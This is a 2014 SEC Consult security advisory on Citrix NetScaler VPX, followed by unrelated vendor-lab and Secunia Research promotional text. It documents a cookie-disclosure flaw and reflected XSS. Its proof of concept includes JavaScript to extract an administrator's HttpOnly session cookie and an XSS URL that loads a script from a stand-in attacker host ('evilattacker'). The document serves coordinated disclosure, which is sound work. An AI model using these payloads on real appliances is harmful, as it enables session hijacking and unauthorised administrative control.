Vendor/product description:
- -----------------------------
"Citrix NetScaler helps organizations build enterprise cloud networks that
embody the characteristics and capabilities that define public cloud services,
such as elasticity, expandability and simplicity. NetScaler brings to
enterprise IT leaders multiple advanced technologies that were previously
available only to large public cloud providers."

"As an undisputed leader of service and application delivery, Citrix NetScaler
solutions are deployed in thousands of networks around the globe to optimize,
secure and control the delivery of all enterprise and cloud services. They
deliver 100 percent application availability, application and database server
offload, acceleration and advanced attack protection. Deployed directly in
front of web and database servers, NetScaler solutions combine high-speed load
balancing and content switching, http compression, content caching, SSL
acceleration, application flow visibility and a powerful application firewall
into a single, easy-to-use platform."

URL: <http://www.citrix.com/products/netscaler-application-delivery-controller/overview.html>

Business recommendation:
- ------------------------
Attackers can exploit XSS and other vulnerabilities that lead to cookie disclosure
to execute administrative actions.

Affected Systems should be updated as soon as possible.

Vulnerability overview/description:
- -----------------------------------
1) Cookie disclosure
The error handler in the Apache g_soap module prints all of the request header
information including the HTTP Cookie field. This vulnerability can be used in
XSS attacks to gain access to the otherwise well protected (HttpOnly) "SESSID"
cookie of an administrator.

2) Reflected Cross-Site Scripting (XSS)
Citrix Netscaler suffers from multiple reflected Cross-Site Scripting
vulnerabilities, which allow an attacker to steal user information,
impersonate users and perform administrative actions on the appliance.

There are many parameters which are not properly sanitized and thus
vulnerable to XSS.

Proof of concept:
- -----------------
1) Cookie disclosure
A GET request to the SOAP handler returns the following information:

GET /soap HTTP/1.1
Host: <host>
*OTHER HEADER FIELDS*

Response:
HTTP/1.1 200 OK
...
Content-Type: text/html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
...
 <BODY>
  <H1>mod_gsoap Apache SOAP Server Error</H1>
<p><strong>No body received</strong>
...
<br>Cookie: SESSID=*SESSION ID*;
...

In combination with an XSS vulnerability (see 2) an attacker can use the following
code to extract cookies including the SESSID cookie of an administrator:

var request = new XMLHttpRequest();
request.open('GET', '/soap', false);
request.send();
lines=request.responseText.split('<br>')
for (var i in lines){
    if (lines[i].indexOf('Cookie')==0){
                alert(lines[i]);
                break;
        }
}

2) Reflected Cross-Site Scripting
Accessing the following URL will include the Javascript code from [http://evilattacker/evil.js:](http://evilattacker/evil.js%3A)
http://<host>/menu/topn?name=";<%2fscript><script+src%3d"http:%2f%2fevilattacker%2fevil.js"><%2fscript>

Other pages do not sanitize user input properly as well:
http://<host>/pcidss/launch_report?type=AA";alert('xss');x="

http://<host>/menu/guiw?nsbrand=AA<"'>AA&protocol=BB<"'>BB&id=CC<"'>CC
Note: Content-Type is application/x-java-jnlp-file, so the injected script code
is not interpreted. However, it is possible to inject arguments into a Java
JNLP file, which might be used in further attacks.

Vulnerable / tested versions:
- -----------------------------
The vulnerabilities have been verified to exist in Citrix NetScaler VPX 10.0,
which was the most recent version at the time of discovery.
According to the vendor versions before 10.1-126.12 and 9.3-62.4 are vulnerable

Vendor contact timeline:
- ------------------------
2014-01-09: Sending advisory and proof of concept exploit via encrypted
            channel.
2014-01-17: Vendor acknowledges receipt of advisory.
2014-04-04: Requesting status update.
2014-06-10: Vendor is "in the process of scheduling the release of a security

2014-07-07: Requesting list of affected/non-affected versions CVE-IDs.
2014-07-07: Vendors is "still in the final stages of releasing the bulletin".
2014-07-07: Requesting info about cause of delay.
2014-07-07: Vendor is "still hopeful that the bulletin will be available soon".
2014-07-14: Vendor states that fixed version will be available on July 15/16.
2014-07-16: SEC Consult releases coordinated security advisory.

# Vulnerability Lab

With the **Vulnerability Lab**, SEC Consult **operates its own internal security laboratory**, in order to ensure an international know-how advantage over attackers in the areas of network and application security. In addition, this facility serves the support with high-quality penetration tests and with the evaluation of new technologies and is at the service of our customers. Thus, they receive the latest information about security gaps and valid statements about the risk profile of new technologies.

Our Vulnerability Lab follows a [Responsible Disclosure Policy](/vulnerability-lab/responsible-disclosure-policy/) which aims to provide vendors with the necessary information and timeframe needed to validate and fix a security flaw in order to mutually coordinate the public release of a security advisory as part of our responsible disclosure process. This document also clarifies the extent and limitation of effort the SEC Consult Vulnerability Lab will invest. It can be found [here](/vulnerability-lab/responsible-disclosure-policy/).

Here you find all our **[studies and whitepapers](/vulnerability-lab/studies-and-whitepapers/)**.

You can reach our Vulnerability Lab through security-research(at)sec-consult.com. The PGP key with fingerprint F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F can be downloaded [here](https://keys.openpgp.org/vks/v1/by-fingerprint/F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F).

The SEC Consult Vulnerability Lab is also an official [CNA](https://www.cve.org/PartnerInformation/ListofPartners/partner/SEC-VLab) (CVE Numbering Authority) and our scope for assigning CVE numbers is all vulnerabilities discovered in third-party hardware/software by the SEC Consult Vulnerability Lab, which are not in another CNA's scope.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
